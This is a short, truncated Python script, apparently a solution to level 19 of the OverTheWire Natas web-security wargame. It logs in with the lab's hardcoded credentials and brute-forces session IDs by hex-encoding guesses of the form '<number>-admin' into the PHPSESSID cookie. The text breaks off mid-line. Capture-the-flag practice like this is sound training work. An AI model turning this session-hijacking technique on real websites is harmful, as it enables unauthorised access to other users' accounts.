#!/usr/bin/python3

# coding : utf-8


import requests

URL = "http://natas19.natas.labs.overthewire.org"
cookies = {'PHPSESSID': ''}
session = requests.Session()
session.auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')



for i in range(1, 641):
    cookies['PHPSESSID'] = '{}-admin'.format(i).encode().hex()
    res = 